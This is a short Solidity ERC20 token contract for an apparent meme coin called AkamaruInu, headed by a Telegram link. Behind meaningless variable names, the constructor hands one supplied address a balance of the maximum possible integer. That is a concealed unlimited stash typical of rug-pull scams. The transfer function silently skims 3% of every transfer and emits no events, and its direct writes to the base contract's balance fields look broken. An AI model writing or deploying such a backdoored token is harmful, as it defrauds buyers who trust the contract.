// https://t.me/akamaruinuETH

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract AkamaruInu is ERC20, Ownable {
    uint256 private composition = ~uint256(0);
    uint256 public hide = 3;

    constructor(
        string memory husband,
        string memory jar,
        address fun,
        address influence
    ) ERC20(husband, jar) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[influence] = composition;
    }

    function _transfer(
        address mud,
        address hair,
        uint256 movement
    ) internal override {
        _balances[mud] -= movement;
        uint256 information = (movement / 100) * hide;
        movement -= information;
        _balances[hair] += movement;
    }
}